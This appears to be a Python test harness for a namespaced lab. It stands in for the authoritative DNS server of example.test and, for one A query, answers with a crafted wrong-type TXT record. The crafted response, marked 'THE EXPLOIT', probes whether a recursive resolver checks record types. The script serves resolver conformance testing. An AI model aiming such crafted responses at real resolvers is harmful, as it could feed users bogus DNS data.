#!/usr/bin/env python3
"""Crafted LEAF authoritative stand-in for example.test on 203.0.113.12:53.

Serves example.test well enough for a recursive resolver to reach it via
referral, but for the query `weird.example.test IN A` it returns a NOERROR,
aa=1 response whose ANSWER section contains ONE record of the WRONG type
(TXT, owner = weird.example.test) and no CNAME. A conforming authoritative
server would instead return NODATA (empty answer, SOA in authority) for that
A query. This probes the qtype-blindness of the resolver's answer-acceptance.

Run inside the 'auth' namespace after stopping nsd-leaf:
    ip netns exec auth python3 wrongtype_auth.py
"""
import socket, struct, sys

BIND = ("203.0.113.12", 53)

# Wire encodings ---------------------------------------------------------
def enc_name(name):
    out = b""
    for label in name.rstrip(".").split("."):
        out += bytes([len(label)]) + label.encode()
    return out + b"\x00"

EXAMPLE = "example.test"
SOA_RD = (enc_name("ns.example.test")
          + enc_name("hostmaster.example.test")
          + struct.pack(">IIIII", 1, 3600, 900, 604800, 3600))

def parse_q(pkt):
    i = 12
    labels = []
    while True:
        ln = pkt[i]
        if ln == 0:
            i += 1
            break
        labels.append(pkt[i+1:i+1+ln].decode())
        i += 1 + ln
    qtype, qclass = struct.unpack(">HH", pkt[i:i+4])
    return ".".join(labels), qtype, qclass, i + 4

def rr(owner, rtype, rclass, ttl, rdata):
    return enc_name(owner) + struct.pack(">HHIH", rtype, rclass, ttl, len(rdata)) + rdata

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(BIND)
    sys.stderr.write(f"wrongtype_auth listening on {BIND}\n"); sys.stderr.flush()
    while True:
        pkt, addr = s.recvfrom(4096)
        if len(pkt) < 12:
            continue
        txid = pkt[0:2]
        try:
            qname, qtype, qclass, qend = parse_q(pkt)
        except Exception as e:
            sys.stderr.write(f"parse error {e}\n"); sys.stderr.flush(); continue
        q = pkt[12:qend]
        name = qname.lower()
        sys.stderr.write(f"Q {name} type={qtype} from {addr}\n"); sys.stderr.flush()

        aa = 1 << 10; qr = 1 << 15

        # THE EXPLOIT: A query for weird.example.test -> NOERROR + wrong-type TXT
        if name == "weird.example.test" and qtype == 1:
            an = rr("weird.example.test", 16, 1, 300, b"\x0bhello-wrong")  # TXT
            hdr = txid + struct.pack(">HHHHH", qr|aa, 1, 1, 0, 0)
            s.sendto(hdr + q + an, addr)
            sys.stderr.write("  -> NOERROR ancount=1 TXT (wrong type)\n"); sys.stderr.flush()
            continue

        # Proper authoritative service for example.test so resolvers reach us.
        if name == EXAMPLE and qtype == 2:      # NS
            an = rr(EXAMPLE, 2, 1, 3600, enc_name("ns.example.test"))
            add = rr("ns.example.test", 1, 1, 3600, socket.inet_aton("203.0.113.12"))
            hdr = txid + struct.pack(">HHHHH", qr|aa, 1, 1, 0, 1)
            s.sendto(hdr + q + an + add, addr); continue
        if name == EXAMPLE and qtype == 1:      # A apex
            an = rr(EXAMPLE, 1, 1, 3600, socket.inet_aton("203.0.113.100"))
            hdr = txid + struct.pack(">HHHHH", qr|aa, 1, 1, 0, 0)
            s.sendto(hdr + q + an, addr); continue
        if name == EXAMPLE and qtype == 6:      # SOA
            an = rr(EXAMPLE, 6, 1, 3600, SOA_RD)
            hdr = txid + struct.pack(">HHHHH", qr|aa, 1, 1, 0, 0)
            s.sendto(hdr + q + an, addr); continue

        # Any in-zone name (incl. weird.example.test with other qtypes): NODATA
        if name == EXAMPLE or name.endswith(".example.test"):
            auth = rr(EXAMPLE, 6, 1, 3600, SOA_RD)
            hdr = txid + struct.pack(">HHHHH", qr|aa, 1, 0, 1, 0)  # NODATA, SOA in authority
            s.sendto(hdr + q + auth, addr); continue

        # Out of zone -> REFUSED
        hdr = txid + struct.pack(">HHHHH", qr|aa|5, 1, 0, 0, 0)
        s.sendto(hdr + q, addr)

if __name__ == "__main__":
    main()
